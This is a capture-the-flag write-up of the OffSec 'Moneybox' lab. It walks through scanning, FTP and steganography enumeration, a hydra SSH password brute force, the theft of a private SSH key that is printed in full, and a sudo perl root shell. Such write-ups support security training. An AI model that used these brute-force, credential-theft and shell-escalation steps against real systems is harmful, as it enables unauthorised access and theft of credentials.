# Moneybox

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, you will thoroughly enumerate a web application to uncover hidden directories, 
retrieve a secret key, and brute-force SSH login credentials. You will escalate privileges 
by exploiting a misconfigured SUID binary to gain root access.
Released: 2 Nov 2022
```

Machine link: [https://portal.offsec.com/machine/moneybox-42547/overview/details](https://portal.offsec.com/machine/moneybox-42547/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ export TARGET_IP=192.168.148.230      

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:49 CET
Nmap scan report for 192.168.148.230
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.198
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: MoneyBox
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
```

We have three services running:

- vsftpd 3.0.3 on port 21
- OpenSSH 7.9p1 on port 22
- Apache httpd 2.4.38 on port 80

### Analyse the web service

Next, we analyse the contents of the web server.

Manually browsing to `http://192.168.148.230/` shows this web page

![Web Site on Moneybox](Images/Web_Site_on_Moneybox.png)

There is nothing interesting in the HTML source code.

Doing some basic web enumeration with nmap, we find nothing

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ nmap -v -p80 --script http-enum $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-22 08:52 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:52
Completed NSE at 08:52, 0.00s elapsed
Initiating Ping Scan at 08:52
Scanning 192.168.148.230 [4 ports]
Completed Ping Scan at 08:52, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:52
Completed Parallel DNS resolution of 1 host. at 08:52, 0.01s elapsed
Initiating SYN Stealth Scan at 08:52
Scanning 192.168.148.230 [1 port]
Discovered open port 80/tcp on 192.168.148.230
Completed SYN Stealth Scan at 08:53, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.148.230.
Initiating NSE at 08:53
Completed NSE at 08:53, 3.28s elapsed
Nmap scan report for 192.168.148.230
Host is up (0.033s latency).

PORT   STATE SERVICE
80/tcp open  http

NSE: Script Post-scanning.
Initiating NSE at 08:53
Completed NSE at 08:53, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.66 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

### Do a gobuster scan

Next, we search for additional files and directories with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.230
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 621]
/blogs                (Status: 200) [Size: 353]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

The `/blogs` page shows a message from a hacker

```text
I'm T0m-H4ck3r

I Already Hacked This Box and Informed.But They didn't Do any Security configuration

If You Want Hint For Next Step......?
```

In the HTML source of the page there is an intreresting comment

```html
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

Visiting this page (`http://192.168.148.230/S3cr3t-T3xt/`) we find another message

```text
There is Nothing In this Page.........
```

and an additional HTML comment

```html
<!..Secret Key 3xtr4ctd4t4 >
```

Probably leet speak for `extract data`.

### Enumerate the FTP server

Next, we check the contents of the FTP server

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ ftp anonymous@$TARGET_IP
Connected to 192.168.148.230.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20494|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 26  2021 .
drwxr-xr-x    2 0        0            4096 Feb 26  2021 ..
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
ftp> mget try*
mget trytofind.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||56090|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |****************************************************************************************************************************************************************|  1068 KiB    0.98 MiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:01 (976.27 KiB/s)
ftp> quit
```

Let's analyse the image and try to extract data

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ file trytofind.jpg                                               
trytofind.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 3984x2988, components 3
                                                         
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ steghide extract -sf trytofind.jpg
Enter passphrase: 
wrote extracted data to "data.txt".
```

With `3xtr4ctd4t4` as the password we get the embedded file `data.txt`

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ cat data.txt                     
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

So we have a user (`renu`) with a very weak password.

### Bruteforce the password for renu

Next, we try to bruteforce the password with `hydra`

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ hydra -l renu -P /usr/share/wordlists/rockyou.txt -t 32 -f ssh://$TARGET_IP
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 09:13:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
[DATA] attacking ssh://192.168.148.230:22/
[22][ssh] host: 192.168.148.230   login: renu   password: 987654321
[STATUS] attack finished for 192.168.148.230 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-22 09:13:34
```

Yes, we now have SSH credentials (`renu:987654321`)

### Connect with SSH as renu

Now we can connect with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ ssh renu@$TARGET_IP        
The authenticity of host '192.168.148.230 (192.168.148.230)' can't be established.
ED25519 key fingerprint is SHA256:4skFgbTuZiVgZGtWwAh5WRXgKXTdP7U5BhYUsIg9nWw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.148.230' (ED25519) to the list of known hosts.
renu@192.168.148.230's password: 
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 23 10:00:13 2022
renu@MoneyBox:~$ id
uid=1001(renu) gid=1001(renu) groups=1001(renu)
renu@MoneyBox:~$
```

### Get the user flag

Let's look for the user flag next

```bash
renu@MoneyBox:~$ ls -la
total 40
drwxr-xr-x 5 renu renu 4096 Oct 11  2022 .
drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
-rw------- 1 renu renu  642 Feb 26  2021 .bash_history
-rw-r--r-- 1 renu renu  220 Apr 17  2019 .bash_logout
-rw-r--r-- 1 renu renu 3526 Apr 17  2019 .bashrc
drwxr-xr-x 3 root root 4096 Feb 26  2021 ftp
drwxr-xr-x 3 renu renu 4096 Feb 26  2021 .local
-rw-r--r-- 1 root root   33 Feb 21 23:48 local.txt
-rw-r--r-- 1 renu renu  807 Apr 17  2019 .profile
drwx------ 2 renu renu 4096 Feb 26  2021 .ssh
renu@MoneyBox:~$ cat local.txt 
5<REDACTED>6
renu@MoneyBox:~$ 
```

### Enumeration for privesc as renu

We now enumerate the system for privilege escalation opportunities.

We start with checking for available sudo commands

```bash
renu@MoneyBox:~$ sudo -l
[sudo] password for renu: 
Sorry, user renu may not run sudo on MoneyBox.
renu@MoneyBox:~$ 
```

Next, we check for SUID and GUID binaries

```bash
renu@MoneyBox:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
   142631    316 -rwxr-sr-x   1 root     ssh        321672 Jan 31  2020 /usr/bin/ssh-agent
   135544     44 -rwxr-sr-x   1 root     crontab     43568 Oct 11  2019 /usr/bin/crontab
   130112     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   134059     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
   133578     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   135479     16 -rwxr-sr-x   1 root     tty         14736 May  4  2018 /usr/bin/bsd-write
   130107     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   130106     72 -rwxr-sr-x   1 root     shadow      71816 Jul 27  2018 /usr/bin/chage
   130108     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   130109     32 -rwxr-sr-x   1 root     shadow      31000 Jul 27  2018 /usr/bin/expiry
   134061     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   131640     36 -rwxr-sr-x   1 root     tty         34896 Jan 10  2019 /usr/bin/wall
   133305     36 -rwsr-xr-x   1 root     root        34896 Apr 22  2020 /usr/bin/fusermount
   133725     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
   130110     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   142367    156 -rwsr-xr-x   1 root     root       157192 Jan 20  2021 /usr/bin/sudo
   130819     52 -rwsr-xr--   1 root     messagebus    51184 Oct 10  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   266482     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   142638    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   130920     40 -rwxr-sr-x   1 root     shadow        39616 Feb 13  2019 /usr/sbin/unix_chkpwd
renu@MoneyBox:~$ 
```

Nothing that stands out.

Next, we check the bash history file

```bash
renu@MoneyBox:~$ cat .bash_history 
cler
ls
ls -la
cd /home
ls
clear
cd
ls
ls -la
exit
clear
ls
ls -la
cd /home
ls
cd lily
ls
ls -la
clear
cd
clear
ssh-keygen -t rsa
clear
cd .ssh
ls
ssh-copy-id lily@192.168.43.80
clear
cd
cd -
ls -l
chmod 400 id_rsa
ls -l
ssh -i id_rsa lily@192.168.43.80
clear
ssh -i id_rsa lily@192.168.43.80
cd
clear
cd .ssh/
ls
ssh -i id_rsa lily@192.168.43.80
su lily
clear
cd
sudo apt install openssh
sudo apt update
sudo apt install openssh-server
sudo service ssh start
sudo service ssh status
clear
cd /etc/
ls
cd ssh
ls
nano ssh_config 
ls
nano sshd_config 
clear
cd
ls
ls -la
chsh bash
chsh
clear
su root
clear
sudo apt install openssh
su root
exit
renu@MoneyBox:~$ 
```

It looks like the `renu` user has:

- Generated SSH keys (`ssh-keygen -t rsa`)
- Copied the public key to the `lily` user (`ssh-copy-id lily@192.168.43.80`)
- And verified access (`ssh -i id_rsa lily@192.168.43.80`)

Let's verify this scenario

```bash
renu@MoneyBox:~$ cd ..
renu@MoneyBox:/home$ cd lily
renu@MoneyBox:/home/lily$ cd .ssh
renu@MoneyBox:/home/lily/.ssh$ ls -la
total 12
drwxr-xr-x 2 lily lily 4096 Feb 26  2021 .
drwxr-xr-x 4 lily lily 4096 Oct 11  2022 ..
-rw-r--r-- 1 lily lily  393 Feb 26  2021 authorized_keys
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
renu@MoneyBox:/home/lily/.ssh$ 
```

This looks correct!

### Copy the private key

Let's copy the private key to our Kali machine

```bash
renu@MoneyBox:~$ cd .ssh
renu@MoneyBox:~/.ssh$ ls -la
total 20
drwx------ 2 renu renu 4096 Feb 26  2021 .
drwxr-xr-x 5 renu renu 4096 Oct 11  2022 ..
-r-------- 1 renu renu 1823 Feb 26  2021 id_rsa
-rw-r--r-- 1 renu renu  393 Feb 26  2021 id_rsa.pub
-rw-r--r-- 1 renu renu  222 Feb 26  2021 known_hosts
renu@MoneyBox:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA0SBPbRBG0y9APu5/qHfbQowEmAFmNFwanKs8qm9qrDbCZwZvHATA
gTUpLboLaLPR2PYc0iJ5Dsw590YrWSV7nplwmrDrDOoAXLbuRg7i/PNnRYM/etjvU73Rey
SZvNniIla7EvGAlUKuN5ooFrOh1ybvgTa1W3H/sat+m4s4kGlQcvrxm4gj6TdCU67RuOPT
XTWXJdBQ5pZtmOp5R+NszOYQgtB0CYgcpnPyN+xtPVbVLGgqY4imsWWp4Jcm9vli0sZiX6
/hIRp1jqUL/dYXsV3eyHZSuoYVDn3+cjcZbyFcxtlRG7oLSV7pDEi1pNhYZxHQy6ggh12P
tVflxAfRdwAAA8hAXVfHQF1XxwAAAAdzc2gtcnNhAAABAQDRIE9tEEbTL0A+7n+od9tCjA
SYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM
6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq3
6biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09
VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2V
EbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3AAAAAwEAAQAAAQBmBYE6D8q9lDufd/LH
WVGaMXy8O1KFELna3J8H9rrvsPc+E6F45ciUQD8Kk8ylE7S4R7jfuvmcAn306EKVhve789
c/YDgLYM00bfnoK7MI/CXRf6okYFjBXcUocj6eJx1u6yjwoOi96H3dmlMcYB4APHpzayEm
r4KyRpvJfi3mJNjPLS2wNhotTlOKA3OYcuwq9PO5O3ftmAhd1m5YH91jSM/ykeRRe6jt7X
aAbKqnvPWoXQVIzhYKqET68R1fCC6/BWGFPYkxvjGiC+N0OgMI82UMDXyKN5/DMU1/vLhj
V98GkTL+X2fZYDnMpGSQjWIjMvjkZUfmDHYuwAdXPBFBAAAAgQChZCjF2uHbq2WgJETxHg
grXSQcneY0oCVJQIGezhyl7Lip5CNT9P/0VBp6CcGJ8UpzmygtIvchinWd4rqmOOVwkRsR
Mw78IgQuoTIzkxqBZ6nluk/PExFrIZNGxoD3PJgZ+9+3PLvhimeEW7BRpId9Mnyed6uwxi
f1N9tfY7cSLAAAAIEA7F4NEJiRghxMDDF1qySIzmstCat2m0y3quqOPJvt/zZBuD9X/C0q
GJXP9AvJsyoVZxCbSpESUlc0Y61bbCrhn48AEPly6KuM96zW8i3JW3d2G6TK38xzE2BrUx
6y0sAYv5IP9P5UP/kIxGCafr+bUJThIUwWAkbPiBzSjuBfCE8AAACBAOJ/Bas5s3M8iE1Z
7ZVt5tlGtN+9jTuxoqDP/9WuYAmKKlsu3KD1MGux6iF79MYlg7+8yKInTzuGTv/G3aD7Qf
YhsiLPQ/9JdHubK82FYXSOR5ssO6Jl25UM5j2naZBQzhyogIP+P0daIu/hqYdXoHzxYGgU
tTfxqrmU8rLImbJZAAAAC3JlbnVAZGViaWFuAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
renu@MoneyBox:~/.ssh$ 
```

And login as lily with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ vi id_rsa  

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Moneybox]
└─$ ssh -i id_rsa lily@$TARGET_IP     
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
lily@MoneyBox:~$ 
```

### Enumeration for privesc as lily

Next, we do another round of privesc enumeration.

What can we do with `sudo`?

```bash
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
lily@MoneyBox:~$ 
```

We can run [perl](https://gtfobins.org/gtfobins/perl/#shell)

### Get a root shell

Now we can get a root shell

```bash
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### Get the root flag

Finally, we can get the root flag

```bash
# cd /root
# ls -l
total 4
-rw-r--r-- 1 root root 33 Feb 21 23:48 proof.txt
# cat proof.txt
7<REDACTED>6
# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [Hydra - GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [perl - GTFOBins](https://gtfobins.org/gtfobins/perl/)
- [perl - Linux manual page](https://linux.die.net/man/1/perl)
- [Perl - Wikipedia](https://en.wikipedia.org/wiki/Perl)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [steghide - Homepage](https://steghide.sourceforge.net/)
- [steghide - Kali Tools](https://www.kali.org/tools/steghide/)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
